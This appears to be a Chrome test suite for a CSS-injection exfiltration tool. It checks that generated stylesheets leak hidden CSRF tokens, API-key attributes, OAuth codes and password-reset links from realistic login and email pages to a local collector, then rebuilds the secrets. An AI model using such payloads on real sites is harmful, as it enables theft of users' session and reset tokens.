'use strict';

// Real Chrome checks, separate from the portable Node suite. Uses an isolated
// temporary profile and DevTools pipe; no browser automation dependency needed.
const assert = require('node:assert/strict');
const http = require('node:http');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawn } = require('node:child_process');
const { once } = require('node:events');
const P = require('../public/payload');
const B = require('../public/blind');
const { buildConfig, PRESETS } = require('../server');
const { parsePayload, leak } = require('./helpers');
const { stitchCharset } = require('../lib/stitch');
const { el, page, requests } = require('./blind-helpers');

const escapeHTML = s => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
const secret = '0123456789abcdefabcdcafe9012deadbeef56789a';
const cases = [];

function targeted(name, cfg, value, html, verify) {
  cases.push({ name, html, verify, build(origin) {
    const css = P.generateCSS(cfg, origin);
    const expected = new Set(leak(parsePayload(css), value).requests
      .map(r => (r.t === 'm' ? '' : r.t + '/') + P.pathChunk(r.c)));
    return { css, expected, probeCount: P.ruleCount(cfg) };
  } });
}

function blind(name, fields, html, doc, recon = false) {
  cases.push({ name, html, build(origin) {
    const payload = recon ? B.reconPayload() : B.extractPayload(fields);
    return { css: B.render(payload, origin), expected: requests(doc, payload),
      probeCount: payload.rules.length };
  } });
}

for (const windowSize of [3, 4]) {
  const anchor = buildConfig({ ...PRESETS.anchor, windowSize }).config;
  const value = 'https://example.com/m/callback/email?token=' + secret + '&operation=login&x=cafebabe';
  targeted(`anchor ${windowSize}`, anchor, value, `<a href="${escapeHTML(value)}">target</a>`);
  for (const hostMode of ['sibling', 'has']) {
    const cfg = buildConfig({ ...PRESETS.hidden, hostMode, windowSize }).config;
    targeted(`hidden ${hostMode} ${windowSize}`, cfg, secret,
      `<input type="hidden" name="csrf" value="${secret}"><span>host</span>`);
  }
  targeted(`no matches ${windowSize}`, { selector: 'a', attribute: 'href', tag: 'a', windowSize,
    useStartsWith: true, useEndsWith: true }, '!', '<a href="!">empty</a>');

  for (const host of ['form', 'html']) {
    const form = el('form');
    blind(`blind input ${host} ${windowSize}`,
      [{ id: 0, kind: 'input', name: 'csrf', host, windowSize }],
      `<form><input type="hidden" name="CSRF" value="${secret}"><span>host</span></form>`,
      page([form, el('input', { type: 'hidden', name: 'CSRF', value: secret }, { form })]));
  }
  for (const [kind, name, tag, attr] of [
    ['meta', 'csrf-token', 'meta', 'content'], ['data', 'data-api-key', 'div', 'data-api-key'],
    ['a', 'code', 'a', 'href'], ['form', 'state', 'form', 'action'],
  ]) {
    const v = ['a', 'form'].includes(kind) ? `https://example.com/?${name}=${secret}&x=cafebabe` : secret;
    const attrs = { [attr]: v, ...(kind === 'meta' ? { name } : {}) };
    const markup = Object.entries(attrs).map(([a, b]) => `${a}="${escapeHTML(b)}"`).join(' ');
    blind(`blind ${kind} ${windowSize}`, [{ id: 0, kind, name, host: 'self', windowSize }],
      `<${tag} ${markup}>${tag === 'meta' ? '' : `host</${tag}>`}`, page([el(tag, attrs)]));
  }
}

// Non-hex charsets: case-insensitive windows (with "/" sent as %2F) and
// case-sensitive pairs, on every host. The secrets mix case and symbols.
const charsetSecrets = {
  alnum: 'Ab3dEfGh9JkLmN0pQrStUvWxYz12345678',
  base64: 'Ab3d+fG/9JkL=N0pQrSt+vWx/z1234567=',
  base64url: 'Ab3d-fG_9JkL-N0pQrSt_vWx-z12345678',
};
// Stitch the token from the requests Chrome actually made, as the server does.
const recovers = (built, value) => hits => {
  const data = { chunks: [], pairs: [] };
  for (const hit of hits) {
    const [, t, c] = hit.match(/^(?:([sec])\/)?(.*)$/);
    const chunk = decodeURIComponent(c);
    if (t === 's') data.start = chunk;
    else if (t === 'e') data.end = chunk;
    else if (t === 'c') data.pairs.push(chunk);
    else data.chunks.push(chunk);
  }
  const { config, contextChunks, contextCasePairs } = built;
  const result = stitchCharset(data, { charset: P.charsetOf(config.charset), windowSize: config.windowSize,
    tokenLength: value.length, context: contextChunks, caseContext: contextCasePairs });
  assert.equal(result && result.token, value, JSON.stringify(result));
  assert.equal(result.candidates, undefined, JSON.stringify(result));
};
for (const [charset, value] of Object.entries(charsetSecrets)) {
  const anchor = buildConfig({ ...PRESETS.anchor, charset, tokenLength: value.length });
  const href = 'https://example.com/m/callback/email?token=' + value + '&operation=login&x=LoGiN';
  targeted(`anchor ${charset}`, anchor.config, href, `<a href="${escapeHTML(href)}">target</a>`, recovers(anchor, value));
  for (const hostMode of ['sibling', 'has']) {
    const built = buildConfig({ ...PRESETS.hidden, hostMode, charset, tokenLength: value.length });
    targeted(`hidden ${hostMode} ${charset}`, built.config, value,
      `<input type="hidden" name="csrf" value="${escapeHTML(value)}"><span>host</span>`, recovers(built, value));
  }
  const form = el('form');
  blind(`blind input form ${charset}`, [{ id: 0, kind: 'input', name: 'csrf', host: 'form', windowSize: 3, charset }],
    `<form><input type="hidden" name="CSRF" value="${escapeHTML(value)}"><span>host</span></form>`,
    page([form, el('input', { type: 'hidden', name: 'CSRF', value }, { form })]));
  const url = `https://example.com/?code=${value}&x=CafeBabe`;
  blind(`blind a ${charset}`, [{ id: 0, kind: 'a', name: 'code', host: 'self', windowSize: 3, charset }],
    `<a href="${escapeHTML(url)}">host</a>`, page([el('a', { href: url })]));
}
// Numeric and symbol-only probes omit the redundant case-insensitive flag.
// Check both their HTTP requests and reconstruction without any case pairs.
for (const [charset, value] of Object.entries({ alnum: '0123456789', base64: '09+/=123', base64url: '09-_123' })) {
  const built = buildConfig({ ...PRESETS.hidden, charset, tokenLength: value.length });
  targeted(`no letters ${charset}`, built.config, value,
    `<input type="hidden" name="csrf" value="${value}"><span>host</span>`, recovers(built, value));
}
blind('blind meta and data, alnum and base64url', [
  { id: 0, kind: 'meta', name: 'csrf-token', host: 'self', windowSize: 3, charset: 'alnum' },
  { id: 1, kind: 'data', name: 'data-api-key', host: 'self', windowSize: 3, charset: 'base64url' },
], `<meta name="csrf-token" content="${charsetSecrets.alnum}"><div data-api-key="${charsetSecrets.base64url}">host</div>`,
page([el('meta', { name: 'csrf-token', content: charsetSecrets.alnum }),
  el('div', { 'data-api-key': charsetSecrets.base64url })]));

const oneShotConfig = { targets: B.TARGETS, urlKinds: ['a', 'form'],
  dataNames: B.ONE_SHOT_DATA_NAMES, urlCharset: 'hex', urlWindow: 4 };
const oneShotFields = B.oneShotFields(oneShotConfig);
const oneShotFormValue = `fedcba9876543210abcdefff`;
const oneShotForm = el('form', { action: `/login?state=${oneShotFormValue}` });
const oneShotURL = `https://example.com/?code=${secret}&next=home`;
const oneShotDoc = page([oneShotForm,
  el('input', { type: 'hidden', name: 'csrf_token', value: charsetSecrets.alnum }, { form: oneShotForm }),
  el('meta', { name: 'csrf-token', content: charsetSecrets.base64 }),
  el('a', { href: oneShotURL }),
  el('span', { 'data-api-key': charsetSecrets.base64url }),
]);
cases.push({ name: 'one-shot blind discovery and extraction',
  html: `<form action="/login?state=${oneShotFormValue}"><input type="hidden" name="csrf_token" value="${charsetSecrets.alnum}">host</form>` +
    `<meta name="csrf-token" content="${charsetSecrets.base64}">` +
    `<a href="${escapeHTML(oneShotURL)}">host</a><span data-api-key="${charsetSecrets.base64url}">host</span>`,
  build(origin) {
    const payload = B.oneShotPayload(oneShotFields, oneShotConfig);
    return { css: B.render(payload, origin), expected: requests(oneShotDoc, payload), probeCount: payload.rules.length };
  },
});

const busyConfig = { targets: ['input'], dataNames: [], urlCharset: 'hex', urlWindow: 4 };
const busyFields = B.oneShotFields(busyConfig);
const busySecret = charsetSecrets.alnum;
const busyInput = el('input', { type: 'hidden', name: 'csrf', value: busySecret });
const busyRows = Array.from({ length: 600 }, (_, i) =>
  `<div><span>row</span><a href="/item?id=${i}&ref=list">link</a><input name="q${i}"><p>text</p></div>`).join('');
cases.push({ name: 'one-shot hidden input on a busy page',
  html: `<input type="hidden" name="csrf" value="${busySecret}"><span>host</span>${busyRows}`,
  build(origin) {
    const payload = B.oneShotPayload(busyFields, busyConfig);
    return { css: B.render(payload, origin), expected: requests(page([busyInput]), payload),
      probeCount: payload.rules.length };
  },
});

const quoted = '"\\' + secret + '\n&';
targeted('escaped attribute context', { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3,
  startContext: '"\\', endContext: '\n&' }, quoted, `<a href="${escapeHTML(quoted)}">target</a>`);
targeted('repeated fragments', { selector: 'a', attribute: 'href', tag: 'a', windowSize: 4,
  useStartsWith: true, useEndsWith: true }, 'abababababab', '<a href="abababababab">target</a>');
for (const windowSize of [3, 4]) {
  // Includes properties whose compact names contain underscores and the
  // boundary between two- and three-character names.
  const value = '003e0fbe0fbf0fc0abcdef';
  targeted(`compact property boundaries ${windowSize}`, { selector: 'a', attribute: 'href', tag: 'a',
    windowSize, useStartsWith: true, useEndsWith: true }, value, `<a href="${value}">target</a>`);
}

for (const value of ['?x=dead&CODE=abcdef012345#fragment', '?code=1234&CODE=abcdef&code=5678']) {
  blind('URL separators and case: ' + value, [{ id: 0, kind: 'a', name: 'code', host: 'self', windowSize: 3 }],
    `<a href="${escapeHTML(value)}">host</a>`, page([el('a', { href: value })]));
}

const reconElements = [];
const reconMarkup = [];
const reconValues = ['abcdef0123', '', 'ABCDEF', 'abcxyz', 'ab&cd', '01_ab', '123456', 'aZ+09/bY==', 'aZ-09_bY',
  'two words', 'a"b'];
for (const [tag, names, attr] of [['input', B.INPUT_NAMES, 'value'], ['meta', B.META_NAMES, 'content']]) {
  names.forEach((name, i) => {
    const attrs = { name: i % 2 ? name.toUpperCase() : name, [attr]: reconValues[i % reconValues.length] };
    if (tag === 'input') attrs.type = 'hidden';
    reconElements.push(el(tag, attrs));
    reconMarkup.push(`<${tag} ${Object.entries(attrs).map(([a, v]) => `${a}="${escapeHTML(v)}"`).join(' ')}>`);
  });
}
blind('recon all input/meta names with mixed values', [], reconMarkup.join(''), page(reconElements), true);
const dataElements = B.DATA_ATTRS.map((name, i) => el('div', { [name]: reconValues[i % reconValues.length] }));
blind('recon data attributes with mixed values', [], dataElements
  .map(e => `<div ${Object.entries(e.attrs).map(([a, v]) => `${a}="${escapeHTML(v)}"`).join(' ')}>host</div>`).join(''),
page(dataElements), true);

targeted('localhost collector with same-origin CSP', { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3,
  useStartsWith: true, useEndsWith: true }, secret, `<a href="${secret}">target</a>`);
Object.assign(cases[cases.length - 1], { hostname: 'localhost', csp: "img-src 'self'" });

// Realistic full pages rendered in Chrome: the token sits in among ordinary
// page chrome (headings, copy, other links, buttons), and we check the browser
// fires exactly the fragment requests that rebuild it. A clean 40-char hex
// token with 4-char windows recovers as a single answer.
const hexSecret = '3f8a1c9e0b2d4f6a8c1e3b5d7f9a0c2e4b6d8f0a';
const resetCfg = buildConfig({
  selector: 'a[href^="https://app.example.com/account/reset?"]', attribute: 'href',
  tokenName: 'reset token', startSelector: 'token=', endSelector: '&uid=',
  tokenLength: hexSecret.length, windowSize: 4, charset: 'hex',
});
const resetHref = `https://app.example.com/account/reset?token=${hexSecret}&uid=4821`;
targeted('realistic password-reset email (anchor)', resetCfg.config, resetHref,
  `<div class="email-body" style="font-family:sans-serif">` +
  `<h1>Reset your password</h1><p>Hi Alex,</p>` +
  `<p>We received a request to reset your password. Click the button below to continue.</p>` +
  `<a class="btn btn-primary" href="${escapeHTML(resetHref)}">Reset password</a>` +
  `<p>Didn't request this? <a href="https://app.example.com/security">Let us know</a>.</p>` +
  `<footer><a href="https://app.example.com/unsubscribe?u=4821">Unsubscribe</a></footer></div>`,
  recovers(resetCfg, hexSecret));

const loginCfg = buildConfig({
  selector: 'input[type="hidden"][name="authenticity_token"]', attribute: 'value',
  tokenName: 'authenticity_token', startSelector: '', endSelector: '',
  tokenLength: hexSecret.length, windowSize: 4, charset: 'hex', hostMode: 'has',
});
targeted('realistic login form (hidden input, html:has host)', loginCfg.config, hexSecret,
  `<header><nav><a href="/">Home</a><a href="/pricing">Pricing</a></nav></header>` +
  `<main><h1>Sign in</h1>` +
  `<form action="/session" method="post" accept-charset="UTF-8">` +
  `<input type="hidden" name="authenticity_token" value="${hexSecret}" autocomplete="off">` +
  `<label>Email <input type="email" name="email"></label>` +
  `<label>Password <input type="password" name="password"></label>` +
  `<button type="submit">Log in</button></form>` +
  `<p><a href="/password/new">Forgot your password?</a></p></main>`,
  recovers(loginCfg, hexSecret));

const form = el('form');
const both = `<form><input type="hidden" name="csrf" value="${secret}">` +
  '<input type="hidden" name="nonce" value="fedcba9876543210"><span>host</span></form>';
const doc = page([form, el('input', { type: 'hidden', name: 'csrf', value: secret }, { form }),
  el('input', { type: 'hidden', name: 'nonce', value: 'fedcba9876543210' }, { form })]);
blind('two fields share a form', [
  { id: 0, kind: 'input', name: 'csrf', host: 'form', windowSize: 3 },
  { id: 1, kind: 'input', name: 'nonce', host: 'form', windowSize: 3 },
], both, doc);
blind('recon', [], both, doc, true);
cases.push({ name: 'recon retained during extraction', html: both, build(origin) {
  const recon = B.reconPayload();
  const extract = B.extractPayload([{ id: 0, kind: 'input', name: 'csrf', host: 'form', windowSize: 3 }]);
  return { css: B.render(recon, origin) + B.render(extract, origin),
    expected: requests(doc, { rules: [...recon.rules, ...extract.rules], hosts: [...recon.hosts, ...extract.hosts] }) };
} });

const fields = B.assignHosts([
  { id: 0, kind: 'input', name: 'csrf', host: 'form', windowSize: 4 },
  { id: 1, kind: 'meta', name: 'csrf-token', host: 'self', windowSize: 4 },
  { id: 2, kind: 'data', name: 'data-api-key', host: 'self', windowSize: 4 },
  { id: 3, kind: 'a', name: 'code', host: 'self', windowSize: 4 },
]).fields;
const href = `https://example.com/?code=${secret}&x=cafebabe`;
blind('multiple stylesheets', fields,
  `<meta name="csrf-token" content="${secret}"><form><input type="hidden" name="csrf" value="${secret}">host</form>` +
  `<div data-api-key="${secret}">host</div><a href="${escapeHTML(href)}">host</a>`,
  page([form, el('input', { type: 'hidden', name: 'csrf', value: secret }, { form }),
    el('meta', { name: 'csrf-token', content: secret }), el('div', { 'data-api-key': secret }), el('a', { href })]));

async function main() {
  const executable = process.env.CHROME_BIN || [
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    '/usr/bin/google-chrome', '/usr/bin/chromium', '/usr/bin/chromium-browser',
  ].find(p => fs.existsSync(p));
  // Part of `npm test`, so skip (rather than fail) where Chrome is absent.
  // CI that must run these sets FRAG_REQUIRE_BROWSER to turn a skip into a
  // failure, and CHROME_BIN for a non-standard install.
  if (!executable) {
    const msg = 'browser checks skipped: no Chrome/Chromium found (set CHROME_BIN)';
    if (process.env.FRAG_REQUIRE_BROWSER) { console.error(msg); process.exitCode = 1; }
    else console.log(msg);
    return;
  }
  const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'frag-browser-'));
  let active;
  let chrome;
  const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  const server = http.createServer((req, res) => {
    res.setHeader('Cache-Control', 'no-store');
    if (req.url === '/fixture') {
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      if (active.csp) res.setHeader('Content-Security-Policy', active.csp);
      return res.end(`<!doctype html><html><head>${active.css}</head><body>${active.html}</body></html>`);
    }
    if (req.url !== '/favicon.ico') active.hits.add(req.url.slice(1));
    res.setHeader('Content-Type', 'image/gif');
    res.end(pixel);
  });
  try {
    server.listen(0, '127.0.0.1');
    await once(server, 'listening');
    const origin = `http://127.0.0.1:${server.address().port}`;
    chrome = spawn(executable, ['--headless=new', '--no-first-run', '--no-default-browser-check',
      '--disable-background-networking', '--disable-component-update', '--disable-sync',
      '--remote-debugging-pipe', `--user-data-dir=${profile}`], { stdio: ['ignore', 'ignore', 'pipe', 'pipe', 'pipe'] });
    let stderr = '';
    chrome.stderr.on('data', data => { stderr = (stderr + data).slice(-4000); });
    const pending = new Map();
    const listeners = new Map();
    let nextId = 0;
    let buffer = '';
    chrome.stdio[4].setEncoding('utf8');
    chrome.stdio[4].on('data', data => {
      buffer += data;
      let end;
      while ((end = buffer.indexOf('\0')) >= 0) {
        const message = JSON.parse(buffer.slice(0, end));
        buffer = buffer.slice(end + 1);
        if (message.id) {
          const p = pending.get(message.id);
          if (!p) continue;
          pending.delete(message.id);
          clearTimeout(p.timer);
          if (message.error) p.reject(new Error(JSON.stringify(message.error)));
          else p.resolve(message.result);
        } else {
          const key = message.sessionId + ':' + message.method;
          const listener = listeners.get(key);
          if (listener) { listeners.delete(key); listener(message.params); }
        }
      }
    });
    const send = (method, params = {}, sessionId) => new Promise((resolve, reject) => {
      const id = ++nextId;
      const timer = setTimeout(() => { pending.delete(id); reject(new Error(`Chrome timed out: ${method}\n${stderr}`)); }, 60000);
      pending.set(id, { resolve, reject, timer });
      chrome.stdio[3].write(JSON.stringify({ id, method, params, sessionId }) + '\0');
    });
    chrome.once('error', err => {
      for (const p of pending.values()) { clearTimeout(p.timer); p.reject(err); }
      pending.clear();
    });
    console.log((await send('Browser.getVersion')).product);
    for (const fixture of cases) {
      const fixtureOrigin = fixture.hostname ? `http://${fixture.hostname}:${server.address().port}` : origin;
      active = { ...fixture, ...fixture.build(fixtureOrigin), hits: new Set() };
      const { targetId } = await send('Target.createTarget', { url: 'about:blank' });
      const { sessionId } = await send('Target.attachToTarget', { targetId, flatten: true });
      await send('Page.enable', {}, sessionId);
      const loaded = new Promise((resolve, reject) => {
        const key = sessionId + ':Page.loadEventFired';
        const timer = setTimeout(() => { listeners.delete(key); reject(new Error(`Page timed out: ${fixture.name}`)); }, 60000);
        listeners.set(key, () => { clearTimeout(timer); resolve(); });
      });
      await send('Page.navigate', { url: fixtureOrigin + '/fixture' }, sessionId);
      await loaded;
      const { result, exceptionDetails } = await send('Runtime.evaluate', { returnByValue: true, expression: `(() => {
        let probes = 0;
        const count = rules => { for (const r of rules) {
          if (r.style && [...r.style].some(p => p.startsWith('--'))) probes++;
          if (r.cssRules) count(r.cssRules);
        } };
        for (const s of document.styleSheets) count(s.cssRules);
        const urls = new Set();
        for (const e of document.querySelectorAll('*')) for (const pseudo of [null, '::before', '::after']) {
          const bg = getComputedStyle(e, pseudo).backgroundImage;
          for (const m of bg.matchAll(/url\\("([^\"]*)"\\)/g)) urls.add(new URL(m[1]).pathname.slice(1));
        }
        return { probes, urls: [...urls] };
      })()` }, sessionId);
      assert.ok(!exceptionDetails, JSON.stringify(exceptionDetails));
      if (active.probeCount !== undefined) assert.equal(result.value.probes, active.probeCount, fixture.name + ': parsed probes');
      assert.deepEqual(new Set(result.value.urls), active.expected, fixture.name + ': computed background URLs');
      assert.deepEqual(active.hits, active.expected, fixture.name + ': actual HTTP requests');
      if (active.verify) active.verify(active.hits);
      console.log(`ok ${fixture.name} (${active.hits.size} requests)`);
      await send('Target.closeTarget', { targetId });
    }
    console.log(`${cases.length} browser checks passed`);
    const exited = once(chrome, 'exit');
    await send('Browser.close');
    await exited;
  } finally {
    if (chrome && chrome.exitCode === null) {
      const exited = once(chrome, 'exit');
      chrome.kill();
      await exited;
    }
    server.closeAllConnections();
    await new Promise(resolve => server.close(resolve));
    fs.rmSync(profile, { recursive: true, force: true });
  }
}

main().catch(err => { console.error(err); process.exitCode = 1; });
